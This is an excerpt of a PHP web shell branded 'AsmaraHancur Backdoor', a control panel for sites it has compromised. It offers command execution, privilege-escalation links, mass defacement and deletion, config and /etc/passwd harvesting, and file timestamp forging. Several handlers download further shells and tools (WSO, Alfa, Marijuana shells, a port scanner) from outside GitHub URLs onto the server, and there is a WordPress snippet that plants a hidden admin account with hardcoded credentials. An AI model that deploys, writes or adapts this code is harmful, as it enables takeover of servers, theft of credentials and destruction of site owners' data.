    ...
    <html>
        <head>
            <meta charset='utf-8'>
            <meta name='author' content='AsmaraHancur'>
            <meta name='viewport' content='width=device-width, initial-scale=0.40'>
            <link rel='icon' href='https://l.top4top.io/p_3414dmo230.png'>
            <title>AsmaraHancur 1337</title>
    ...
    <div class='container-fluid'>
        <div class='py-3' id='main'>
            <div class='box shadow bg-dark p-4 rounded-3'>
                <a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h1>AsmaraHancur 〄 Backdoor</h1></a>";
                if(isset($_7['path'])){
                    $path = $_7['path'];
                    chdir($path);
                }else{
            ...
            <div class='container-fluid'>
                ...
                <div class='collapse text-dark mb-3' id='collapseExample'>
                    ...
                    Disable Function : <pre>$disfc</pre>
                    </div>
                </div>
            </div>
    <div class='text-center'>
        <div class='btn-group flex-wrap'>
            <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=adminer'>
                <i class='bi bi-cast' style='color: #0d6efd;'></i> Adminer
            </a>
            <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=autoroot'>
                <i class='bi bi-bug' style='color: #dc3545;'></i> Auto Root
            </a>
            <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=cmd'>
                <i class='bi bi-terminal' style='color: #ffc107;'></i> Command
            </a>
            <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=rdp'>
                <i class='bi bi-intersect' style='color: #198754;'></i> Create RDP
            </a>
            <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=config'>
                <i class='bi bi-tv' style='color: #0dcaf0;'></i> Config
            </a>
            <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=getools'>
                <i class='bi bi-toggles' style='color: #6c757d;'></i> Get Shell/Tools
            </a>
            <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=getroot'>
                <i class='bi bi-tools' style='color: #6610f2;'></i> Get Localroot
            </a>
            <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=deface'>
                <i class='bi bi-exclamation-diamond' style='color: #e83e8c;'></i> Mass Deface
            </a>
            <a class='btn btn-outline-danger btn-sm' href='?dir=$path&id=delete'>
                <i class='bi bi-trash' style='color: #fff;'></i> Mass Delete
            </a>
            <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=network'>
                <i class='bi bi-hdd-network' style='color: #17a2b8;'></i> Network
            </a>
            <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=scanroot'>
                <i class='bi bi-search' style='color: #fd7e14;'></i> Scan Root
            </a>
            <a class='btn btn-outline-light btn-sm' href='?dir=$path&id=upload'>
                <i class='bi bi-upload' style='color: #20c997;'></i> Upload
            </a>
            <a class='btn btn-outline-light btn-sm' href='https://AsmaraHancur.my.id'>
                <i class='bi bi-box-arrow-in-left' style='color: #adb5bd;'></i> Website
            </a>
        </div>
            </div>";
    ...
    password: b4b1raga#1337</code></pre>
            ...
            if($_7['id'] == 'autoroot'){
            ob_implicit_flush();ob_end_flush();
            echo '<center class="anu">Auto Root by AsmaraHancur</center>';
                    echo '
                    <div class="container-fluid language-javascript">
                        <div class="shell mb-3">
    ...
    <a href='https://github.com/Snoopy-Sec/Localroot-ALL-CVE/tree/master/FreeBSD/2013/CVE-2013-2171' class='text-decoration-none text-light'>CVE-2013-2171 | FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation</a><br>
            ...
            <div class='text-center'>
                <div class='btn-group mb-3'>
                    <a class='btn btn-outline-primary btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=wso'><i class='bi bi-peace'></i> Wso Shell </a>
                    <a class='btn btn-outline-secondary btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=alfa'><i class='bi bi-peace'></i> Alfa Tesla Shell </a>
                    <a class='btn btn-outline-success btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=marijuana'><i class='bi bi-peace'></i> Marijuana Shell </a>
                    <a class='btn btn-outline-info btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=wpadd'><i class='bi bi-person-plus-fill'></i> WP Add Admin </a>
                    <a class='btn btn-outline-warning btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=shellscan'><i class='bi bi-shield-check'></i> Shell Scanner </a>
                    <a class='btn btn-outline-danger btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=csrf'><i class='bi bi-shield-slash'></i> CSRF </a>
                    <a class='btn btn-outline-warning btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=portscan'><i class='bi bi-radar'></i> Port Scan </a>
                    <a class='btn btn-outline-success btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=connect'><i class='bi bi-link'></i> Connect </a>
                    <a class='btn btn-outline-info btn-sm' href='".$_SERVER['REQUEST_URI']."&id_two=bughtml'><i class='bi bi-bug-fill'></i> BUG Html </a>
                </div>
            </div>";        
            echo "<b><center class=anu>";
            if (isset($_GET['id_two']) && $_GET['id_two'] == "portscan") {
                echo "<center class='anu'>Get Port Scan Tool<br>";
                function get_portscan($url, $save_as) {
                    $fp = fopen($save_as, "w");
                    $ch = curl_init();
                ...
                if (file_exists("portscan.php")) {
                    echo "<gr><a style='color:white;text-decoration:none;' href='$full/portscan.php' target='_blank'>Click Here</a></gr></center>";
                } else {
                    if (get_portscan("https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/port.php", "portscan.php")) {
                        echo "<gr><a style='color:white;text-decoration:none;' href='$full/portscan.php' target='_blank'>Click Here</a></gr></center>";
                    } else {
                        echo "<rd>Failed to create Port Scan tool</rd>";
                    }
                    echo "</center>";
                }
            }
            if (isset($_GET['id_two']) && $_GET['id_two'] == "connect") {
                echo "<center class='anu'>Get Connect Tool<br>";
                function get_connect($url, $save_as) {
                    $fp = fopen($save_as, "w");
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
                ...
                if (file_exists("connect.php")) {
                    echo "<gr><a style='color:white;text-decoration:none;' href='$full/connect.php' target='_blank'>Click Here</a></gr></center>";
                } else {
                    if (get_connect("https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/wp-connect.php", "connect.php")) {
                        echo "<gr><a style='color:white;text-decoration:none;' href='$full/connect.php' target='_blank'>Click Here</a></gr></center>";
                    } else {
                        echo "<rd>Failed to create Connect tool</rd>";
                    }
                    echo "</center>";
                }
            }
            if (isset($_GET['id_two']) && $_GET['id_two'] == "bughtml") {
                echo "<center class='anu'>Get BUG HTML File<br>";
                function get_bughtml($url, $save_as) {
                    $fp = fopen($save_as, "w");
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
                ...
                if (file_exists("Video-Viral-SMA-Terbaru.html")) {
                    echo "<gr><a style='color:white;text-decoration:none;' href='$full/Video-Viral-SMA-Terbaru.html' target='_blank'>Click Here</a></gr></center>";
                } else {
                    if (get_bughtml("https://asmarahancur.my.id/viral-sma-terbaru.html", "Video-Viral-SMA-Terbaru.html")) {
                        echo "<gr><a style='color:white;text-decoration:none;' href='$full/Video-Viral-SMA-Terbaru.html' target='_blank'>Click Here</a></gr></center>";
                    } else {
                        echo "<rd>Failed to create BUG Html</rd>";
                    }
                    echo "</center>";
                }
            }                 
        ...
        if(file_exists('babimarijuana.php')) {
            ...
            if(marijuana("https://raw.githubusercontent.com/BOTKNTL/kontol/master/maricoli.php","babimarijuana.php")) {
                ...
                echo "<rd>Failed to create marijuana shell:(</rd>";}
                    ...
                    <div class='container-fluid language-javascript'>
                        <div class='shell mb-3'>
                            <pre style='font-size:10px;'><code>function asmaradmin(){
    $login = 'asmara';
    $passw = 'asmara#1337';
    ...
    add_action('init','asmaradmin');</code></pre>
                        </div>
    ...
    <input class='btn btn-dark btn-sm' type='submit' name='g' value='Upload!'></form></form></div>";}
        ...
        if(file_exists('scan.php')) {
            ...
            if(babidetect("https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/WebAppScanner.php","scan.php")) {
                echo "<gr><a style='color:white;text-decoration:none;' href=$full/scan.php target='_blank'>Click Here</a></gr></center>";
            } else {
            ...
            // config grabber
            if($_7['id'] == 'config'){
        echo '<center class="anu"><br>Grab Config by AsmaraHancur</center>';
        $etc = fopen("/etc/passwd", "r") or die("<rd>can't read /etc/passwd:(</rd>");
        $idx = mkdir("Asmara_CONFIG", 0777);
        $isi_htc = "Options allnRequire NonenSatisfy Any";
        $htc = fopen("Asmara_CONFIG/.htaccess","w");
        fwrite($htc, $isi_htc);
                    ...
                    if(is_readable($user_config_dir)) {
                        ...
                        foreach($grab_config as $config => $nama_config) {
                            ...
                            if($ambil_config == '') {
                                ...
                                $file_config = fopen("Asmara_CONFIG/$shizuo-$nama_config.txt","w");
        ...
        echo "<center><a style='text-decoration:none;color:white;' href='?path=$path/shizuo_CONFIG'><font>Click Here</font></a></center>";
            ...
            // adminer
            if($_7['id'] == 'adminer'){
                echo "<center class='anu'>Get Adminer Succes<br>";
        ...
        if(file_exists('adminer.php')) {
            ...
            if(adminer("https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/adminer.php","adminer.php")) {
                echo "<gr><a style='color:white;text-decoration:none;' href='$full/adminer.php' target='_blank'>Click Here</a></gr></center>";
            } else {
            ...
            <div class='card card-body text-dark input-group mb-3'>
                ...
                <div class='form-check'>
                    ...
                    <textarea class='form-control btn-sm text-dark' rows='7' name='script' placeholder='Hacked By AsmaraHancur'></textarea>
    ...
    if ($_7['id'] == 'upload') {
        ...
        if (isset($_POST['url_upload'])) {
            ...
            if ($filedata !== false) {
                if (file_put_contents("$path/$filename", $filedata)) {
                    echo "<strong>Upload via URL</strong> $filename OK! " . ok() . "</div>";
                } else {
                    echo "<strong>Upload via URL</strong> $filename FAILED! " . er() . "</div>";
                }
            } else {
                echo "<strong>Failed to fetch URL</strong> $url " . er() . "</div>";
            }
        }
        ...
        <div class='card card-body text-dark input-group mb-3'>
            <strong>Upload File via URL</strong>
            <form method='POST'>
                <div class='input-group'>
                    <input class='form-control form-control-sm text-dark' type='url' name='url' placeholder='https://example.com/file.txt' required>
                    <input class='btn btn-dark btn-sm' type='submit' name='url_upload' value='Upload'>
                </div>
            </form>
        </div>";
    }
            ...
            if (isset($_GET['dir']) && $_GET['id'] == "scanroot") {
                ob_implicit_flush();ob_end_flush();s();
                echo '<center class="anu">Scan Root By AsmaraHancur</center>';
                echo "
                <div class='text-center'>
                    <div class='btn-group mb-3'>
                        <a class='btn btn-outline-primary btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=autoscan><i class='bi bi-bug'></i> Auto Scan </a>
                        <a class='btn btn-outline-secondary btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=scansd><i class='bi bi-search'></i> Scan SUID </a>
                        <a class='btn btn-outline-success btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=esg><i class='bi bi-search'></i> Exploit Suggester </a>
                        <a class='btn btn-outline-info btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=autoscan2><i class='bi bi-bug'></i> Auto Scan v2 </a>
                        <a class='btn btn-outline-warning btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=scansd2><i class='bi bi-search'></i> Scan SUID v2 </a>
                        <a class='btn btn-outline-danger btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=esg2><i class='bi bi-search'></i> Exploit Suggester v2 </a>
                        ...
                        <a class='btn btn-outline-primary btn-sm' href=http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."&id_two=lpesh2><i class='bi bi-bug'></i> CVE-2022-37706 LPE v2</a>
                    </div>
                </div>";
            ...
            echo "
            <div class='btn-group'>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit_time&opn=$path/$file'><i class='bi bi-calendar2-week-fill'></i></a>
                ...
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chmod&opn=$file'><i class='bi bi-key-fill'></i></a>
            ...
            if (isset($_7['action']) && $_7['action'] == 'chmod' && isset($_7['opn'])) {
                $file = $_7['opn'];
                s(); // tampilan header atau style
                echo "<center class='anu'>Change Permission (CHMOD)</center>";
                if (isset($_POST['newperm'])) {
                    $newperm = $_POST['newperm'];
                    if (chmod($file, octdec($newperm))) {
                        echo "<div class='alert alert-success'>Permission updated to $newperm</div>";
                    } else {
                        echo "<div class='alert alert-danger'>Failed to update permission.</div>";
                    }
                }
                ...
                echo "
            <div class='card card-body text-dark input-group mb-3'>
                <strong>Change File Permission (CHMOD)</strong>
                <form method='POST'>
                    <div class='input-group mb-2'>
                        <span class='input-group-text'>Current</span>
                        <input class='form-control form-control-sm text-dark' type='text' value='$currentPerm' disabled>
                    </div>
                    <div class='input-group'>
                        <input class='form-control form-control-sm text-dark' type='text' name='newperm' placeholder='e.g. 0644 or 0755' required>
                        <input class='btn btn-dark btn-sm' type='submit' name='chmod' value='Change'>
                    </div>
                </form>
            </div>";
            }
            if (isset($_GET['action']) && $_GET['action'] == 'edit_time' && isset($_GET['opn'])) {
                $target = $_GET['opn'];
                
                if (file_exists($target)) {
                    echo "<div class='card card-body text-dark input-group mb-3'>
                            <strong>Edit File Timestamp</strong>
                            <form method='POST'>
                                <div class='input-group mb-2'>
                                    <span class='input-group-text'>Modified Time</span>
                                    <input class='form-control form-control-sm text-dark' type='datetime-local' name='mtime' required>
                                </div>
                                <input type='hidden' name='file_target' value='$target'>
                                <input class='btn btn-dark btn-sm' type='submit' name='change_time' value='Apply'>
                            </form>
                        </div>";
                } else {
                    echo "<div class='text-danger'>File not found.</div>";
                }
            }
            if (isset($_POST['change_time']) && isset($_POST['file_target']) && isset($_POST['mtime'])) {
                $file = $_POST['file_target'];
                $newTime = strtotime($_POST['mtime']);
                if (touch($file, $newTime)) {
                    echo "<div class='text-success'>Timestamp updated successfully!</div>";
                } else {
                    echo "<div class='text-danger'>Failed to update timestamp.</div>";
                }
            }
            ...
            <td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' href='?dir=$path&action=view&opn=$file'>$_f</a></td>
                ...
                echo "
    <td class='text-center'>
        <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$path/$file'>
            <i class='bi bi-pencil-square text-warning'></i>
        </a>
        <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$path/$file'>
            <i class='bi bi-pencil-fill text-primary'></i>
        </a>
        <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chmod&opn=$path/$file'>
            <i class='bi bi-key-fill text-secondary'></i>
        </a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit_time&opn=$path/$file'>
        <i class='bi bi-calendar2-week-fill text-info'></i>
        </a>
        <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$path/$file'>
            <i class='bi bi-download text-success'></i>
        </a>
        <a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$path/$file'>
            ...
            </div><center><div class='text-secondary'><hr><font color=white>Powered &copy; AsmaraHancur</font></div></center>
        </div>
    </div>
    </body>
    </html>
